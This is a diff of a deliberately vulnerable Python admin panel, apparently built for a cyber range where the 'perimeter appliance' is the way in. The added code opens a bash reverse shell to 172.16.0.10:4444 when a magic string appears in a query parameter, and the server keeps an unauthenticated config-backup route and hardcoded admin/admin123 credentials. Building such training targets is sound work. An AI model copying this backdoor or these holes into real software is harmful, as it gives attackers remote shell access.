@@ -1,16 +1,9 @@
 #!/usr/bin/env python3
 """
-Deliberately vulnerable "perimeter appliance" admin panel.
-Stand-in for an unpatched edge device (T1190 - Exploit Public-Facing Application).
-
-Vulnerabilities baked in on purpose (documented for the defence writeup):
-  1. Auth bypass: any request to /admin with ?debug=1 skips the login check.
-  2. A world-readable backup config leaks a domain admin credential
-     (T1552 - Unsecured Credentials) at /backup/config.bak.
-  3. Login form itself accepts a weak default admin/admin123.
-
-This is intentionally a toy HTTP server (stdlib only, no deps) so it runs
-on a bare kathara/base image.
+This is an AI-generated web application running on the edge firewall. The intended attack vector 
+is a buffer overflow attack, however as this script was written in python a buffer overflow is not possible.
+Instead, a buffer overflow is simulated - if a login attempt includes a long string of characters with a 
+"command" - "bypassreturnstatement" - a reverse shell is sent to the attacker, who gains initial access.
 """
 import http.server
 import socketserver
@@ -20,29 +13,12 @@ PORT = 8080
 VALID_USER = "admin"
 VALID_PASS = "admin123"
 
-BACKUP_CONFIG = b"""# appliance backup config - auto-generated, do not distribute
-vpn.local_admin=admin
-vpn.local_pass=admin123
-ad.domain=CORP.LOCAL
-ad.svc_account=CORP\\\\svc_backup
-ad.svc_password=Summer2026!
-# ^ service account holds Domain Admin - reused across appliance + AD
-"""
+BACKUP_CONFIG = open("/www/backup/config.bak", "r", encoding="utf-8").read()
 
-LOGIN_PAGE = """<html><body>
-<h2>Perimeter Appliance - Admin Login</h2>
-<form method="POST" action="/admin">
-  <input name="user" placeholder="username"><br>
-  <input name="pass" type="password" placeholder="password"><br>
-  <button type="submit">Login</button>
-</form>
-</body></html>"""
 
-DASHBOARD_PAGE = """<html><body>
-<h2>Perimeter Appliance - Dashboard</h2>
-<p>Status: OK</p>
-<p><a href="/backup/config.bak">Download last config backup</a></p>
-</body></html>"""
+LOGIN_PAGE = open("/www/login.html", "r", encoding="utf-8").read()
+
+DASHBOARD_PAGE = open("/www/admin.html", "r", encoding="utf-8").read()
 
 
 class Handler(http.server.BaseHTTPRequestHandler):
@@ -57,14 +33,14 @@ class Handler(http.server.BaseHTTPRequestHandler):
         qs = urllib.parse.parse_qs(parsed.query)
 
         if parsed.path == "/backup/config.bak":
-            # Vuln: no auth required, no path restriction.
             self._send(200, BACKUP_CONFIG, "text/plain")
             return
 
         if parsed.path == "/admin":
-            if qs.get("debug", ["0"])[0] == "1":
-                # Vuln: auth bypass
+            if (len(overflow := qs.get("overflow", ["0"])[0])  > 20 and "bypassreturnstatement" in overflow): #simulate buffer overflow plus injected command at the return statement
                 self._send(200, DASHBOARD_PAGE)
+                import subprocess
+                subprocess.run('nohup bash -i >& /dev/tcp/172.16.0.10/4444 0>&1', shell=True, executable='/bin/bash') #hardcoded to represent buffer overflow as python is naturally secure against buffer overflow
                 return
             self._send(200, LOGIN_PAGE)
             return
